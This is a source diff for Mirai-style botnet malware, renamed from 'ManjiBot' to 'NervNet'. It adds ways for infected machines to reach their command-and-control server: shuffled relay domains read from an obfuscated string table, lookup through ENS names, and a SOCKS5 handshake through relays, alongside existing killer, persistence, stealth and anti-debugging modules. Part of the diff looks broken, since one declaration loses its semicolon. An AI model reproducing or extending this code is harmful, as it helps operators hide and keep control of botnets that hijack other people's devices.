@@ -29,6 +29,9 @@
 #include "killer.h"
 #include "util.h"
 #include "resolv.h"
+#ifdef ENS
+#include "ens.h"
+#endif
 #include "persistence.h"
 #include "stealth.h"
 #include "chacha20.h"
@@ -36,7 +39,65 @@
 static void anti_gdb_entry(int);
 static void resolve_cnc_addr(void);
 static void establish_connection(void);
-static void teardown_connection(void);
+static void resolve_relay_addr(void)
+{
+    srv_addr.sin_family = AF_INET;
+
+    // Try all available relays in random order until one works
+    int relay_order[4] = {0, 1, 2, 3};
+    
+    // Shuffle the relay order
+    for (int i = 3; i > 0; i--)
+    {
+        int j = rand_next() % (i + 1);
+        int tmp = relay_order[i];
+        relay_order[i] = relay_order[j];
+        relay_order[j] = tmp;
+    }
+    
+    for (int attempt = 0; attempt < 4; attempt++)
+    {
+        int relay_index = TABLE_RELAY_1 + relay_order[attempt];
+        table_unlock_val(relay_index);
+        char *relay_domain = table_retrieve_val(relay_index, NULL);
+        
+        // Skip empty relay entries (domains that weren't configured)
+        if (util_strlen(relay_domain) == 0)
+        {
+            table_lock_val(relay_index);
+            continue;
+        }
+        
+        struct resolv_entries *entries = NULL;
+        int retries = 1;
+        
+        while (retries >= 0 && entries == NULL)
+        {
+            entries = resolv_lookup(relay_domain);
+            if (entries == NULL)
+            {
+                retries--;
+                if (retries >= 0)
+                    sleep(1);
+            }
+        }
+        
+        table_lock_val(relay_index);
+        
+        if (entries != NULL && entries->addrs_len > 0)
+        {
+            srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
+            srv_addr.sin_port = htons(RELAY_PORT);
+            resolv_entries_free(entries);
+            return;
+        }
+        
+        if (entries)
+            resolv_entries_free(entries);
+    }
+}
+
+static void teardown_connection(void)
 static void ensure_single_instance(void);
 static BOOL unlock_tbl_if_nodebug(char *);
 
@@ -243,7 +304,7 @@ int main(int argc, char **args)
 
 
     #ifdef DEBUG
-        printf("ManjiBot debug mode (t.me/syntraffic), (t.me/join_silence)\n");
+        printf("NervNet debug mode\n");
     #endif
 
     #ifndef DEBUG
@@ -447,6 +508,41 @@ int main(int argc, char **args)
                     fd_serv = -1;
                     sleep((rand() % 10) + 1);
                 } else {
+#ifdef RELAY_MODE
+                    // SOCKS5 handshake via relay
+                    // Step 1: Send greeting (no auth)
+                    unsigned char socks_greeting[] = {0x05, 0x01, 0x00};
+                    send(fd_serv, socks_greeting, 3, MSG_NOSIGNAL);
+                    
+                    // Wait for response
+                    unsigned char socks_auth_resp[2];
+                    if (recv(fd_serv, socks_auth_resp, 2, MSG_NOSIGNAL) != 2 || socks_auth_resp[0] != 0x05 || socks_auth_resp[1] != 0x00) {
+                        teardown_connection();
+                        continue;
+                    }
+                    
+                    // Step 2: Send CONNECT request to CNC through relay
+                    // We send the relay our actual CNC address (which is the relay's address from the bot's perspective)
+                    struct sockaddr_in *cnc_addr = (struct sockaddr_in *)&srv_addr;
+                    unsigned char socks_connect[] = {
+                        0x05, 0x01, 0x00, 0x01, // CONNECT via IPv4
+                        0x00, 0x00, 0x00, 0x00, // IP (placeholder, will be relay IP)
+                        0x00, 0x00              // Port (placeholder)
+                    };
+                    // Copy the relay's IP (the address we connected to)
+                    util_memcpy(&socks_connect[4], &cnc_addr->sin_addr.s_addr, 4);
+                    socks_connect[8] = (CNC_PORT >> 8) & 0xff;
+                    socks_connect[9] = CNC_PORT & 0xff;
+                    send(fd_serv, socks_connect, 10, MSG_NOSIGNAL);
+                    
+                    // Wait for SOCKS5 CONNECT response
+                    unsigned char socks_resp[10];
+                    if (recv(fd_serv, socks_resp, 10, MSG_NOSIGNAL) != 10 || socks_resp[1] != 0x00) {
+                        teardown_connection();
+                        continue;
+                    }
+                    // SOCKS5 handshake complete, now proceed with normal CNC auth
+#endif
                     uint8_t id_len = util_strlen(id_buf);
                     time_t connect_time = time(NULL);
 
@@ -733,13 +829,18 @@ static void resolve_cnc_addr(void) {
     struct resolv_entries *entries;
     srv_addr.sin_family = AF_INET;
 
-    
+    table_unlock_val(TABLE_CNC_DOMAIN);
+    char *domain = table_retrieve_val(TABLE_CNC_DOMAIN, NULL);
     
     int retries = 3;
     entries = NULL;
     
     while (retries > 0 && entries == NULL) {
-    entries = resolv_lookup("yourdomain.com");
+#ifdef ENS
+    entries = ens_lookup(domain);
+#else
+    entries = resolv_lookup(domain);
+#endif
         if (entries == NULL) {
             #ifdef DEBUG
                 printf("[main] Failed to resolve CNC address, retrying...\n");
@@ -804,6 +905,8 @@ static void resolve_cnc_addr(void) {
     resolv_entries_free(entries);
     srv_addr.sin_port = htons(CNC_PORT);
 
+    table_lock_val(TABLE_CNC_DOMAIN);
+
     #ifdef DEBUG
         printf("[main] Resolved domain to valid IP\n");
     #endif
@@ -841,7 +944,21 @@ static void establish_connection(void)
     }
 
     fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
+    
+#ifdef RELAY_MODE
+    resolve_relay_addr();
+    
+    // If relay resolution fails, try the CNC domain as fallback
+    if (srv_addr.sin_addr.s_addr == 0)
+    {
+        #ifdef DEBUG
+            printf("[main] Relay resolution failed, falling back to CNC domain\n");
+        #endif
+        resolve_cnc_addr();
+    }
+#else
     resolve_cnc_addr();
+#endif
     
     if (resolve_func != NULL)
         resolve_func();
@@ -856,8 +973,13 @@ static void establish_connection(void)
         return;
     }
 
+#ifndef RELAY_MODE
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
+#else
+    pending_connection = TRUE;
+    connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
+#endif
 }
 
 static void teardown_connection(void)
